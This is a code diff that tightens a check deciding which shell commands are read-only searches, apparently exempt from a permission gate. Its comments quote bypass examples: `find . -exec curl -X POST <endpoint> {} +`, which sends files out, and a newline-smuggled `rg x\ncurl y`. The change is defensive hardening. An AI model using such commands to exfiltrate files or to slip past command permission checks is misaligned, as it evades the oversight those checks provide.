@@ -122,12 +122,15 @@ def _applies_to(rule: dict, file_path: str) -> bool:
 #: when you point it at a redirect is not a read-only verb, and the lesson
 #: generalises — the exemption is for the small set of commands that cannot
 #: produce a network call, not for commands that usually don't.
-_READ_ONLY_VERBS = frozenset({"rg", "grep", "egrep", "fgrep", "ag", "ack", "find", "fd"})
+#: `find`/`fd` were in this set until a review measured `find . -exec curl
+#: -X POST <endpoint> {} +` — an -exec arm makes them executors, not searchers.
+_READ_ONLY_VERBS = frozenset({"rg", "grep", "egrep", "fgrep", "ag", "ack"})
 
 #: Anything that could turn a search into something else. The exemption applies
 #: ONLY to a command with none of these: `rg foo && curl bar` is not a search,
-#: a redirect makes the command WRITE, and a heredoc feeds it content.
-_CHAINS = re.compile(r"(&&|\|\||[;|`>]|<<|\$\()")
+#: a redirect makes the command WRITE, a heredoc feeds it content, and a line
+#: feed is itself a command separator (`rg x\ncurl y` is two commands).
+_CHAINS = re.compile(r"(&&|\|\||[\n;|`>]|<<|\$\()")
 
 
 def _is_read_only_command(command: str) -> bool:
